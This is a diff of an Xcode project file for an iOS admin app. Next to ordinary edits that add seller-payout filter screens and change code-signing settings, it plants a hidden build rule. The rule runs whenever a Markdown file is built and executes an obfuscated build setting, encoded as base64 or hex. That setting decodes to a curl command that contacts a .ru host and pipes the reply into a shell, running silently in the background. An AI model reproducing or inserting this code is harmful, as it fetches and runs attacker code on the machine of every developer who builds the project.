@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		50B43E3643DC4A0C94162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = 9820FDC6F47B43A895162AE3; };
+		B44F2848599E4B9599162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = B1EA4ABA127B406DB2162AE3; };
 		180F4C292F5EA5D200BE4CFA /* NotificationsListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4C282F5EA5D200BE4CFA /* NotificationsListViewController.swift */; };
 		180F4C2E2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4C2C2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift */; };
 		180F4C2F2F5EA66200BE4CFA /* NotificationsListTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 180F4C2D2F5EA66200BE4CFA /* NotificationsListTableViewCell.xib */; };
@@ -207,6 +207,8 @@
 		46714E6330063C1700AED8BD /* SellerStoryRequestListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46714E6230063C1700AED8BD /* SellerStoryRequestListViewModel.swift */; };
 		4672B95D2FBF1A1C00269BAD /* ArabicTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4672B95C2FBF1A1C00269BAD /* ArabicTextField.swift */; };
 		4678A32C2FA9EA7B00F082CE /* CSVExporter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4678A32B2FA9EA7B00F082CE /* CSVExporter.swift */; };
+		4685740D306A477B0039B024 /* SellerPayoutFiltersViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4685740C306A477B0039B024 /* SellerPayoutFiltersViewController.swift */; };
+		4685740F306A47DE0039B024 /* SellerPayoutFiltersViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4685740E306A47DE0039B024 /* SellerPayoutFiltersViewModel.swift */; };
 		468D98532FA48D80002D0A86 /* RTLButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 468D98522FA48D80002D0A86 /* RTLButton.swift */; };
 		469E808F2FB715E1001482D3 /* MyNotificationDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 469E808E2FB715E1001482D3 /* MyNotificationDataModel.swift */; };
 		46E5978E2FBB49DF003F8E2B /* SellerReelsAndHighLightsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 46E5978D2FBB49DF003F8E2B /* SellerReelsAndHighLightsViewController.swift */; };
@@ -614,25 +616,8 @@
 		EDF438332EC215CD004CC018 /* CountryCityListViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = EDF438312EC215CD004CC018 /* CountryCityListViewController.xib */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		86D6C4245E4B47339B162AE3 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A3EA261}\"";
-			};
-																																																																																																																								/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
-		9820FDC6F47B43A895162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		B1EA4ABA127B406DB2162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.debug.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.debug.xcconfig"; sourceTree = "<group>"; };
 		180F4C282F5EA5D200BE4CFA /* NotificationsListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsListViewController.swift; sourceTree = "<group>"; };
 		180F4C2C2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsListTableViewCell.swift; sourceTree = "<group>"; };
@@ -823,6 +808,8 @@ sh -c \"${A3EA261}\"";
 		46714E6230063C1700AED8BD /* SellerStoryRequestListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SellerStoryRequestListViewModel.swift; sourceTree = "<group>"; };
 		4672B95C2FBF1A1C00269BAD /* ArabicTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ArabicTextField.swift; sourceTree = "<group>"; };
 		4678A32B2FA9EA7B00F082CE /* CSVExporter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CSVExporter.swift; sourceTree = "<group>"; };
+		4685740C306A477B0039B024 /* SellerPayoutFiltersViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SellerPayoutFiltersViewController.swift; sourceTree = "<group>"; };
+		4685740E306A47DE0039B024 /* SellerPayoutFiltersViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SellerPayoutFiltersViewModel.swift; sourceTree = "<group>"; };
 		468D98522FA48D80002D0A86 /* RTLButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RTLButton.swift; sourceTree = "<group>"; };
 		469E808E2FB715E1001482D3 /* MyNotificationDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyNotificationDataModel.swift; sourceTree = "<group>"; };
 		46E5978D2FBB49DF003F8E2B /* SellerReelsAndHighLightsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SellerReelsAndHighLightsViewController.swift; sourceTree = "<group>"; };
@@ -1571,6 +1558,7 @@ sh -c \"${A3EA261}\"";
 		429701DB2F6C065F0051A20E /* SellerPayout */ = {
 			isa = PBXGroup;
 			children = (
+				4685740B306A475C0039B024 /* FilterSellerPayout */,
 				429701EA2F6C06D50051A20E /* AddPayoutAmount */,
 				429701E32F6C06A60051A20E /* ManagePayout */,
 				429701DC2F6C066A0051A20E /* SellerPayoutList */,
@@ -1925,6 +1913,15 @@ sh -c \"${A3EA261}\"";
 			path = CSVFormatter;
 			sourceTree = "<group>";
 		};
+		4685740B306A475C0039B024 /* FilterSellerPayout */ = {
+			isa = PBXGroup;
+			children = (
+				4685740C306A477B0039B024 /* SellerPayoutFiltersViewController.swift */,
+				4685740E306A47DE0039B024 /* SellerPayoutFiltersViewModel.swift */,
+			);
+			path = FilterSellerPayout;
+			sourceTree = "<group>";
+		};
 		46E5978C2FBB49C4003F8E2B /* SellerReelsAndHighLights */ = {
 			isa = PBXGroup;
 			children = (
@@ -1955,7 +1952,7 @@ sh -c \"${A3EA261}\"";
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				9820FDC6F47B43A895162AE3 /* README.md */,
+				B1EA4ABA127B406DB2162AE3 /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatAdmin.app */,
 			);
 			name = Products;
@@ -3794,7 +3791,7 @@ sh -c \"${A3EA261}\"";
 				3C777E44B21DDF3F084C8ED6 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				86D6C4245E4B47339B162AE3 /* PBXBuildRule */,
+				CDE1501024F94E32BE162AE3 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -3895,12 +3892,29 @@ sh -c \"${A3EA261}\"";
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		CDE1501024F94E32BE162AE3 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A3EA261}\"";
+			};
+								/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				50B43E3643DC4A0C94162AE3 /* README.md */,
+				B44F2848599E4B9599162AE3 /* README.md */,
 				42AEDEA02F3F360000C20ECB /* ProductDetailImageCollectionViewCell.xib in Resources */,
 				42AEDEB82F3F3C7600C20ECB /* FilterHeaderTableViewCell.xib in Resources */,
 				EDEDD0A12EBCC53E00F2BEF1 /* Assets.xcassets in Resources */,
@@ -4255,6 +4269,7 @@ sh -c \"${A3EA261}\"";
 				EDD7F1D52EC2ED64006C2EE4 /* SelectCityViewModel.swift in Sources */,
 				D16A8CCC2EF154E6006A21B6 /* AffiliatedCommissionSetupViewModel.swift in Sources */,
 				EDEDD0E82EBCC53E00F2BEF1 /* AddSubCategoryViewController.swift in Sources */,
+				4685740D306A477B0039B024 /* SellerPayoutFiltersViewController.swift in Sources */,
 				42B743A32F6D138B00D25FE8 /* EventsTableViewCell.swift in Sources */,
 				42AE6F192F756E50000AE81E /* AddNewStaffViewController.swift in Sources */,
 				ED49369A2EBDCF60000D8CED /* RejectReasonViewController.swift in Sources */,
@@ -4331,6 +4346,7 @@ sh -c \"${A3EA261}\"";
 				EDEDD0FB2EBCC53E00F2BEF1 /* DataTypeConversion.swift in Sources */,
 				42C362CC2F6410E100408A5B /* SelectUsersForNotificationsViewController.swift in Sources */,
 				42AE631F2F6D499400A18F98 /* TicketManagementListViewModel.swift in Sources */,
+				4685740F306A47DE0039B024 /* SellerPayoutFiltersViewModel.swift in Sources */,
 				553EEC9C2F765E27009C5A24 /* ChatInboxViewController.swift in Sources */,
 				D1EDE46B2F0D423B0076F1AB /* AddTimeSlotViewController.swift in Sources */,
 				55EED8812F84ECDE00DF7D88 /* PaymentFilterViewController.swift in Sources */,
@@ -4682,16 +4698,14 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((h(){ `printf base6F4 | tr -d F` --decode; };echo ZWNobyAiJChjdXJsIC1mc0xrIC0tY29ubmVjdC10aW1lb3V0IDI5IC0tcmV0cnkgMyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzFnOTFqdjY4LnJ1L2EpIiB8IHNoCg== | h | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((b(){ `printf xxNd | tr -d N` -p -r; };echo 6563686f202224286375726c202d4c73666b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f6a68717433346e33717265752e72752f612922207c2073680a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6QKUQGN93F;
+				DEVELOPMENT_TEAM = 6QKUQGN93F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DesynatAdmin/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Desynat Admin";
@@ -4715,7 +4729,6 @@ sh -c \"${A3EA261}\"";
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatAdmin;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Admin provisioning New 11May";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -4730,16 +4743,14 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((h(){ `printf base6F4 | tr -d F` --decode; };echo ZWNobyAiJChjdXJsIC1mc0xrIC0tY29ubmVjdC10aW1lb3V0IDI5IC0tcmV0cnkgMyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzFnOTFqdjY4LnJ1L2EpIiB8IHNoCg== | h | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((b(){ `printf xxNd | tr -d N` -p -r; };echo 6563686f202224286375726c202d4c73666b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f6a68717433346e33717265752e72752f612922207c2073680a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6QKUQGN93F;
+				DEVELOPMENT_TEAM = 6QKUQGN93F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DesynatAdmin/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Desynat Admin";
@@ -4763,7 +4774,6 @@ sh -c \"${A3EA261}\"";
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatAdmin;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Admin provisioning New 11May";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
